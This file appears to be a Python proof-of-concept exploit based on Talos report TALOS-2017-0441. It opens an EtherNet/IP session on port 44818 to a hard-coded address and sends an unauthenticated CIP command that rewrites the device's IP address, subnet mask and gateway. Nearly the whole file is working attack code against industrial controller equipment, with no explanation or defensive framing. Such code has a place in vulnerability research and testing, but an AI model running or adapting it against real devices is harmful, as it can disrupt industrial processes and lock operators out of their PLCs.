# Highly inspired by: https://www.talosintelligence.com/vulnerability_reports/TALOS-2017-0441


import socket
import binascii
import random

def pad_hex(hex_str, size):
    if "0x" in hex_str: hex_str = "".join(hex_str.split("0x"))
    if len(hex_str) != size:
        numzeros = size - len(hex_str)
        zeros = "0"*numzeros
        hex_str = "%s%s" % (zeros, hex_str)
    return hex_str
 
def get_tns():
    temp_tns = pad_hex(hex(int(random.random()*65535)).replace("0x",""), 4)
    tns = binascii.unhexlify(temp_tns)
    return tns

def build_eth_instruction(data, session_handle):
    command_code      = b"\x6f\x00"
    status            = b"\x00\x00\x00\x00"
    sender_context    = b"\x00\x00\x00\x01\x00\x28\x1e\x4d"
    options           = b"\x00\x00\x00\x00"
    handle            = b"\x00\x00\x00\x00"
    timeout           = b"\x00\x00"
    num_items         = b"\x02\x00"
    addr_data_type    = b"\x00\x00"
    addr_data_length  = b"\x00\x00"
    data_data_type    = b"\xb2\x00"
    service_code      = b"\x10"
    size_req_path     = b"\x03"
    req_path          = b"\x20\xf5\x24\x01\x30\x05"
    
    data_data_length = len(service_code) + len(size_req_path) + len(req_path) + len(data)
    
    data_length = binascii.unhexlify(hex(data_data_length + 16)[2:]) + b"\x00"
    print(data_length) 
    data_data_length = binascii.unhexlify(hex(data_data_length)[2:]) + b"\x00"
 
    payload = command_code + data_length + session_handle + status + sender_context + options + handle + timeout + num_items + addr_data_type + addr_data_length + data_data_type + data_data_length + service_code + size_req_path + req_path + data
    return payload
 
def send_instruction(instruction_elements, session_handle):
    return_response = ""
    instruction = build_eth_instruction(instruction_elements, session_handle)
    sock.send(instruction)
    
    #return_response = sock.recv(1024)
 	
    return return_response
 

def register_session():
    set_register_payload = "\x65\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x28\x1e\x4d\x00\x00\x00\x00\x01\x00\x00\x00"
    sock.send(bytes(set_register_payload.encode()))
    reg_session_response = binascii.hexlify(sock.recv(28))
    hexlify_str = (reg_session_response.decode('utf-8'))[8:16]
    print(hexlify_str)
    session_handle = binascii.unhexlify(bytes(hexlify_str.encode()))
    return session_handle


dst = "192.168.93.90"
port = 44818
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((dst, port))

session_handle = register_session()
print(session_handle)

#data: 
#   + IP: 192.168.93.93  -> \x5d\x5d\xa8\xc0
#   + Subnet mask: 255.255.255.0 -> \x00\xff\xff\xff 
#   + Gateway: 192.168.93.1  -> \x01\x5d\xa8\xc0
#   + Name Server 1: 0.0.0.0 -> \x00\x00\x00\x00
#   + Name Server 2: 0.0.0.0 -> \x00\x00\x00\x00
#   + Domain name:           -> \x00\x00                  
data = b"\x5d\x5d\xa8\xc0\x00\xff\xff\xff\x01\x5d\xa8\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

send_instruction(data, session_handle)

sock.shutdown(socket.SHUT_RDWR)



